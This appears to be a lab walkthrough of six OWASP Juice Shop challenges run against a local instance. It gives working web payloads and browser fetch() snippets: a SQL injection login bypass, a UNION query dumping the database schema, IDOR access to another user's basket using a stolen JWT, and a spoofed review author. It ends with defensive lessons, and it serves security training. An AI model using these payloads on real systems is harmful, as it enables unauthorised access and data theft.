Detailed Challenge Walkthrough


Challenge 1: Sensitive Data Exposure (A01/A05)
OWASP Class	Category	Goal
A01 / A05	Sensitive Data Exposure	Locate and access a confidential file not publicly reachable (directory/static-file exposure).
Steps Executed:
#	Step
1	Open http://localhost:3000 in the browser.
2	Navigate directly to http://localhost:3000/ftp in the address bar.
3	The FTP directory listing was openly accessible without authentication.
4	Downloaded the file acquisitions.md from the exposed directory.
5	Challenge marked as complete with a green success banner.
Payload & Analysis:
Payload Used	URL: http://localhost:3000/ftp
Why It Worked	The /ftp directory was not protected, allowing any user to browse and download confidential files without logging in.


Challenge 2: Security Misconfiguration (A05)
OWASP Class	Category	Goal
A05	Security Misconfiguration	Discover and reach the unauthenticated application metrics endpoint.
Steps Executed:
#	Step
1	Identified that Juice Shop uses Prometheus for application monitoring.
2	Navigated directly to http://localhost:3000/metrics in the browser.
3	The metrics page loaded with full application data — no login required.
4	Challenge marked as complete with a green success banner.
Payload & Analysis:
Payload Used	URL: http://localhost:3000/metrics
Why It Worked	The /metrics endpoint was left publicly accessible without any authentication, exposing internal application performance data.


Challenge 3: Injection – SQL (A03) — Auth Bypass
OWASP Class	Category	Goal
A03	Injection – SQL	Authenticate as the administrator by injecting into the login form.
Steps Executed:
#	Step
1	Navigated to http://localhost:3000/#/login.
2	In the Email field, entered the SQLi payload: ' OR 1=1--  or we can use ' OR '1'='1  
3	In the Password field, entered any random value (e.g., abc).
4	Clicked Login — successfully authenticated as the admin user.
5	Challenge marked as complete with a green success banner.
Payload & Analysis:
Payload Used	Email: ' OR 1=1--   |   Password: (anything)
Why It Worked	The login query was not parameterized. The ' broke the SQL string, OR 1=1 made the condition always true, and -- commented out the password check.


Challenge 4: Broken Access Control – IDOR (A01)
OWASP Class	Category	Goal
A01	Broken Access Control – IDOR	View another user's shopping basket by manipulating a direct object reference.
Steps Executed:
#	Step
1	Logged in as admin using the SQLi method from Challenge 3.
2	Opened Browser DevTools → Console tab.
3	Retrieved the JWT token using: localStorage.getItem('token')
4	Used fetch() to request another user's basket with a different ID:
5	const token = localStorage.getItem('token');

	fetch('/rest/basket/2', {
	  headers: {
	    'Authorization': 'Bearer ' + token
	  }
	})
	.then(r => r.text())
	.then(data => console.log(data));
6	Response returned basket contents belonging to a different user.
7	Challenge marked as complete with a green success banner.
Payload & Analysis:
Payload Used	GET /rest/basket/2  (with own JWT token)
Why It Worked	The server only verified that the user was authenticated, but never checked whether basket ID 2 belonged to the requesting user.


Challenge 5: Injection – SQL (A03) — UNION-based Schema Extraction
OWASP Class	Category	Goal
A03	Injection – SQL	Extract the database schema using a UNION-based SQL injection in the search parameter.
Steps Executed:
#	Step
1	Opened Browser DevTools → Console tab.
2	Sent the following fetch request with the UNION injection payload:
3	const token = localStorage.getItem('token');

	fetch('/rest/products/search?q=\')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--', {
	  headers: {
	    'Authorization': 'Bearer ' + token
	  }
	})
	.then(r => r.json())
	.then(data => console.log(data));
4	The response contained CREATE TABLE statements revealing the full database schema.
5	Challenge marked as complete with a green success banner.
Payload & Analysis:
Payload Used	')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
Why It Worked	The search parameter was passed directly into a SQL query. The UNION SELECT appended a second query fetching schema definitions from sqlite_master.


Challenge 6: Broken Access Control – Spoofed Review (A01)
OWASP Class	Category	Goal
A01	Broken Access Control	Submit a product review attributed to a different user.
Steps Executed:
#	Step
1	Opened a product page and the review submission dialog.
2	Observed the PUT /rest/products/6/reviews request in DevTools → Network tab.
3	Opened Browser DevTools → Console tab.
4	Sent a PUT request with the author field set to admin@juice-sh.op:
5	fetch('/rest/products/6/reviews', {
  	method: 'PUT',
	  headers: {
	    'Authorization': 'Bearer ' + localStorage.getItem('token'),
	    'Content-Type': 'application/json'
	  },
	  body: JSON.stringify({
	    message: "Great product!",
	    author: "admin@juice-sh.op"
	  })
	})
	.then(r => r.json())
	.then(data => console.log(data));
6	Review was posted and attributed to admin@juice-sh.op instead of the actual logged-in user.
7	Challenge marked as complete with a green success banner.
Payload & Analysis:
Payload Used	PUT /rest/products/6/reviews  |  body: { author: 'admin@juice-sh.op' }
Why It Worked	The API accepted the author field directly from the request body without verifying it matched the authenticated user's identity.




Key Takeaways

The following security lessons were demonstrated through this exercise:

•	Never expose internal directories (FTP, admin panels) without authentication.
•	Monitoring endpoints (/metrics, /health) must be protected behind auth middleware.
•	All SQL queries must use parameterized statements to prevent injection attacks.
•	Access control must verify resource ownership, not just authentication status (IDOR prevention).
•	API endpoints must validate that the submitted author/identity matches the authenticated user's token.
•	UNION-based SQL injection can expose entire database schemas if search inputs are unsanitized.
